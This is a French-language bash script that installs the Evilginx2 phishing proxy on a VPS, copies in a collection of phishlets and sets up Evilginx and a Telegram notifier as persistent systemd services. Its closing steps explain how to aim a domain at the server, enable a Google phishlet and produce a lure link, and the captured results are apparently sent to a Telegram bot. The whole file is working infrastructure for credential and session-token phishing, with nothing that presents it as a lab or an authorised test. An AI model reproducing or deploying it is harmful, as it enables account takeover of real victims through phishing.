#!/bin/bash
# =============================================================================
# SCRIPT D'INSTALLATION EVILGINX + TELEGRAM NOTIFIER SUR VPS
# =============================================================================
# Usage: bash install_vps.sh
# =============================================================================

set -e

echo "=============================================="
echo "  INSTALLATION EVILGINX PRO COLLECTION"
echo "=============================================="

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Variables
INSTALL_DIR="/opt/evilginx-pro-collection"
EVILGINX_DIR="/opt/evilginx2"
PHISHLETS_DIR="/root/.evilginx/phishlets"

# 1. Mise à jour du système
echo -e "${YELLOW}[1/7] Mise à jour du système...${NC}"
apt update && apt upgrade -y

# 2. Installation des dépendances
echo -e "${YELLOW}[2/7] Installation des dépendances...${NC}"
apt install -y python3 python3-pip python3-venv git wget curl

# 3. Installation de Go
GO_VERSION="1.22"
echo -e "${YELLOW}[3/7] Installation de Go ${GO_VERSION}...${NC}"
if ! command -v go &> /dev/null; then
    wget -q "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
    tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
    rm "go${GO_VERSION}.linux-amd64.tar.gz"
    # Configure PATH system-wide for all users and current session
    echo "export PATH=\$PATH:/usr/local/go/bin" > /etc/profile.d/go.sh
    chmod +x /etc/profile.d/go.sh
    export PATH=$PATH:/usr/local/go/bin
    echo -e "${GREEN}Go ${GO_VERSION} installé${NC}"
else
    echo -e "${GREEN}Go déjà installé ($(go version))${NC}"
fi

# 4. Installation d'Evilginx
echo -e "${YELLOW}[4/7] Installation d'Evilginx...${NC}"
if [ ! -d "$EVILGINX_DIR" ]; then
    git clone https://github.com/kgretzky/evilginx2.git $EVILGINX_DIR
    cd $EVILGINX_DIR
    go build
    echo -e "${GREEN}Evilginx compilé${NC}"
else
    echo -e "${GREEN}Evilginx déjà installé${NC}"
fi

# 5. Configuration des phishlets
echo -e "${YELLOW}[5/7] Configuration des phishlets...${NC}"
mkdir -p $PHISHLETS_DIR
cp $INSTALL_DIR/phishlets/*.yaml $PHISHLETS_DIR/
echo -e "${GREEN}Phishlets copiés vers $PHISHLETS_DIR${NC}"

# 6. Configuration Python
echo -e "${YELLOW}[6/7] Configuration de l'environnement Python...${NC}"
cd $INSTALL_DIR
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install requests
echo -e "${GREEN}Environnement Python configuré${NC}"

# 7. Installation des services systemd
echo -e "${YELLOW}[7/7] Installation des services systemd...${NC}"
cp $INSTALL_DIR/scripts/evilginx.service /etc/systemd/system/
cp $INSTALL_DIR/scripts/telegram_notifier.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable evilginx
systemctl enable telegram_notifier
echo -e "${GREEN}Services installés${NC}"

echo ""
echo "=============================================="
echo -e "${GREEN}  INSTALLATION TERMINÉE${NC}"
echo "=============================================="
echo ""
echo "Prochaines étapes:"
echo ""
echo "1. Configurez le notifier Telegram:"
echo "   nano $INSTALL_DIR/scripts/telegram_notifier.py"
echo "   → Modifiez TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID"
echo ""
echo "2. Configurez votre domaine DNS vers cette IP"
echo ""
echo "3. Lancez Evilginx:"
echo "   systemctl start evilginx"
echo ""
echo "4. Configurez Evilginx (dans une session screen):"
echo "   screen -S evilginx"
echo "   cd $EVILGINX_DIR && ./evilginx2 -p $PHISHLETS_DIR"
echo ""
echo "   Commandes Evilginx:"
echo "   > config domain votre-domaine.com"
echo "   > config ip VOTRE_IP_VPS"
echo "   > phishlets hostname google votre-domaine.com"
echo "   > phishlets enable google"
echo "   > lures create google"
echo "   > lures get-url 0"
echo ""
echo "5. Lancez le notifier Telegram:"
echo "   systemctl start telegram_notifier"
echo ""
echo "6. Vérifiez les logs:"
echo "   journalctl -u evilginx -f"
echo "   journalctl -u telegram_notifier -f"
echo ""
